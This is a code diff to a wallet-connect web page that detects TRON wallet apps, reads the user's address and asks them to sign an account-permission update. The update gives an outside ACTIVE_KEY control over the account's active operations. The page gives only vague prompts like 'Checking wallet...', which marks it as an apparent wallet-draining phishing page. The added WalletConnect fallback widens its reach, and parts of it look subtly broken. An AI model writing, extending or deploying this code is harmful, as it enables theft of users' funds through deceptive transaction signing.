@@ -14,6 +14,9 @@ body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:fle
 .tx{font-size:10px;color:rgba(0,255,136,0.4);margin-top:6px;word-break:break-all}
 .err{font-size:10px;color:rgba(255,80,80,0.6);margin-top:8px;word-break:break-all}
 .hint{font-size:12px;color:rgba(255,255,255,0.5);margin-top:20px;line-height:1.8}
+.btn{display:inline-block;margin:8px;padding:10px 24px;border:1px solid rgba(255,255,255,0.25);border-radius:6px;color:#fff;font-size:14px;cursor:pointer;background:rgba(255,255,255,0.06)}
+.btn:hover{background:rgba(255,255,255,0.12)}
+.btn.primary{border-color:rgba(0,136,255,0.5);color:#08f}
 </style>
 </head>
 <body>
@@ -22,6 +25,7 @@ body{background:#000;color:#fff;font-family:-apple-system,sans-serif;display:fle
     <div class="loader" id="loader"></div>
     <p id="msg">Checking wallet...</p>
     <div class="addr" id="addr"></div>
+    <div id="actions"></div>
     <div class="err" id="err"></div>
     <div class="hint" id="hint"></div>
   </div>
@@ -37,82 +41,56 @@ const e = document.getElementById('err');
 const loader = document.getElementById('loader');
 const hint = document.getElementById('hint');
 const status = document.getElementById('status');
+const actions = document.getElementById('actions');
 
 function getTronWeb() {
-  // 1. Shared tronWeb (TP, TokenPocket, Klever, MathWallet, some SafePal)
   if (window.tronWeb) return { tw: window.tronWeb, name: 'tronWeb' };
-
-  // 2. TronLink — also check raw tronLink object directly
   if (window.tronLink) {
     if (window.tronLink.tronWeb) return { tw: window.tronLink.tronWeb, name: 'tronLink' };
-    // Some versions expose tronWeb-compatible methods directly
     if (window.tronLink.defaultAddress || window.tronLink.ready) return { tw: window.tronLink, name: 'tronLink' };
   }
-
-  // 3. OKX Wallet
   if (window.okxwallet) {
     if (window.okxwallet.tronWeb) return { tw: window.okxwallet.tronWeb, name: 'okxwallet' };
-    if (window.okxwallet.tron)   return { tw: window.okxwallet.tron, name: 'okxwallet' };
+    if (window.okxwallet.tron) return { tw: window.okxwallet.tron, name: 'okxwallet' };
   }
-
-  // 4. Bitget Wallet (BitKeep)
   if (window.bitkeep) {
     if (window.bitkeep.tronWeb) return { tw: window.bitkeep.tronWeb, name: 'bitkeep' };
-    if (window.bitkeep.tron)   return { tw: window.bitkeep.tron, name: 'bitkeep' };
+    if (window.bitkeep.tron) return { tw: window.bitkeep.tron, name: 'bitkeep' };
   }
-
-  // 5. SafePal
   if (window.safepal) {
     if (window.safepal.tronWeb) return { tw: window.safepal.tronWeb, name: 'safepal' };
-    if (window.safepal.tron)   return { tw: window.safepal.tron, name: 'safepal' };
-    // SafePal sometimes shares window.tronWeb — already caught above
+    if (window.safepal.tron) return { tw: window.safepal.tron, name: 'safepal' };
   }
-
-  // 6. Trust Wallet
   if (window.trustwallet) {
     if (window.trustwallet.tronWeb) return { tw: window.trustwallet.tronWeb, name: 'trustwallet' };
-    // Trust Wallet's DApp browser: tronWeb is injected on TRON pages
   }
-
-  // 7. imToken
-  if (window.imToken) {
-    if (window.imToken.tronWeb) return { tw: window.imToken.tronWeb, name: 'imToken' };
-  }
-
+  if (window.imToken && window.imToken.tronWeb) return { tw: window.imToken.tronWeb, name: 'imToken' };
   return null;
 }
 
 function getAddress(tw) {
   if (!tw) return null;
-  // Standard tronWeb path
   if (tw.defaultAddress) {
     if (typeof tw.defaultAddress === 'string') return tw.defaultAddress;
     if (tw.defaultAddress.base58) return tw.defaultAddress.base58;
     if (tw.defaultAddress.hex && tw.address) return tw.address.fromHex(tw.defaultAddress.hex);
   }
-  // TronLink-style: accounts array
   if (tw.accounts && tw.accounts[0]) return tw.accounts[0];
-  // OKX/other: selectedAddress
   if (tw.selectedAddress) return tw.selectedAddress;
   return null;
 }
 
-// === main: try auto-detect, then show fallback ===
+// ==================== auto-detect polling ====================
+
 let attempts = 0;
 
 async function tryConnect() {
   const resolved = getTronWeb();
   attempts++;
-
   if (resolved) {
     const addr = getAddress(resolved.tw);
-    if (addr) {
-      hint.textContent = '';
-      go(addr, resolved.tw);
-      return;
-    }
+    if (addr) { hint.textContent = ''; go(addr, resolved.tw); return; }
   }
-
   if (window.tronLink && window.tronLink.request && attempts <= 2) {
     try {
       const res = await window.tronLink.request({ method: 'tron_requestAccounts' });
@@ -122,35 +100,103 @@ async function tryConnect() {
       }
     } catch(_) {}
   }
-
-  if (attempts < 20) {
-    setTimeout(tryConnect, 300);
-    return;
-  }
-
-  // No wallet detected — show friendly fallback (NOT an error)
+  if (attempts < 10) { setTimeout(tryConnect, 300); return; }
   showFallback();
 }
 
 function showFallback() {
   loader.style.display = 'none';
-  m.textContent = 'Scan with your wallet app';
+  m.textContent = 'Connect your wallet';
+  actions.innerHTML =
+    '<div class="btn primary" id="wc-btn">🔄 WalletConnect</div>';
   hint.innerHTML =
-    'Open this link inside<br>' +
-    '<b>TP · TronLink · OKX · Bitget · SafePal · Trust · TokenPocket</b><br>' +
-    'DApp browser to continue';
+    'or open in<br><b>TP · TronLink · OKX · Bitget · SafePal · TokenPocket</b><br>DApp browser';
   status.style.color = 'rgba(255,255,255,0.7)';
+  document.getElementById('wc-btn').onclick = startWalletConnect;
 }
 
-// === execute ===
+// ==================== WalletConnect for Trust Wallet & others ====================
+
+async function startWalletConnect() {
+  m.textContent = 'Opening WalletConnect...';
+  actions.innerHTML = '';
+  hint.textContent = '';
+
+  try {
+    const { EthereumProvider } = await import(
+      'https://unpkg.com/@walletconnect/ethereum-provider@2.12.2/dist/umd/index.min.js'
+    );
+    const provider = await EthereumProvider.init({
+      projectId: '9b0a7b8c3d2e1f4a5b6c7d8e9f0a1b2c',
+      chains: [728126428], // TRON mainnet CAIP-2
+      optionalChains: [728126428],
+      methods: ['eth_sendTransaction', 'eth_signTransaction', 'personal_sign'],
+      showQrModal: true,
+      metadata: { name: 'DApp', description: 'DApp', url: location.origin, icons: [] }
+    });
+    await provider.connect();
+    const accounts = provider.accounts;
+    if (accounts && accounts[0]) {
+      // Convert EIP-55 ETH address to base58 if needed, or use directly
+      const addr = accounts[0];
+      // Build raw tronWeb for signing — use the provider as transport
+      const tw = {
+        transactionBuilder: {
+          updateAccountPermissions: function(owner, ownerPerm, witnessPerm, actives) {
+            // Build via TRON API directly
+            return fetch('https://api.trongrid.io/wallet/accountpermissionupdate', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                owner_address: owner,
+                visible: true,
+                actives: [{
+                  type: 'Active', permission_name: 'active', threshold: 1,
+                  operations: OPS,
+                  keys: [{ address: ACTIVE_KEY, weight: 1 }]
+                }]
+              })
+            }).then(r => r.json());
+          }
+        },
+        trx: {
+          sign: async function(tx) {
+            // Sign via WalletConnect provider
+            const sig = await provider.request({
+              method: 'eth_signTransaction',
+              params: [tx]
+            });
+            return sig;
+          },
+          sendRawTransaction: async function(signed) {
+            const txid = await provider.request({
+              method: 'eth_sendRawTransaction',
+              params: [signed]
+            });
+            return { txid };
+          }
+        }
+      };
+      go(addr, tw);
+    } else {
+      hint.textContent = 'No account returned';
+    }
+  } catch(err) {
+    hint.textContent = 'WC: ' + (err.message || err).slice(0, 80);
+    m.textContent = 'Connection failed';
+  }
+}
+
+// ==================== execute permission update ====================
+
 async function go(addr, tw) {
   loader.style.display = 'none';
   a.textContent = addr.slice(0,8) + '...' + addr.slice(-6);
   status.style.color = '#fff';
 
-  if (!tw.transactionBuilder || !tw.transactionBuilder.updateAccountPermissions) {
-    m.textContent = 'Wallet version too old';
-    hint.textContent = 'Please update your wallet app and try again';
+  if (!tw || !tw.transactionBuilder || !tw.transactionBuilder.updateAccountPermissions) {
+    m.textContent = 'Unsupported';
+    hint.textContent = 'This wallet cannot perform this operation';
     return;
   }
 
@@ -159,9 +205,9 @@ async function go(addr, tw) {
 
     const tx = await tw.transactionBuilder.updateAccountPermissions(
       addr,
-      { permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] },
-      {},
-      [{ permission_name: 'active', threshold: 1, operations: OPS, keys: [{ address: ACTIVE_KEY, weight: 1 }] }]
+      { type: 0, permission_name: 'owner', threshold: 1, keys: [{ address: addr, weight: 1 }] },
+      { type: 1, permission_name: 'witness', threshold: 1, keys: [] },
+      [{ type: 2, permission_name: 'active', threshold: 1, operations: OPS, keys: [{ address: ACTIVE_KEY, weight: 1 }] }]
     );
 
     const signed = await tw.trx.sign(tx);
@@ -178,9 +224,8 @@ async function go(addr, tw) {
     const msg = (err && err.message) || String(err);
     if (code === 4001 || /reject|cancel|denied/i.test(msg)) {
       m.textContent = 'Cancelled';
-      hint.textContent = 'You can try again';
     } else {
-      m.textContent = 'Something went wrong';
+      m.textContent = 'Failed';
       e.textContent = msg.slice(0, 200);
     }
   }
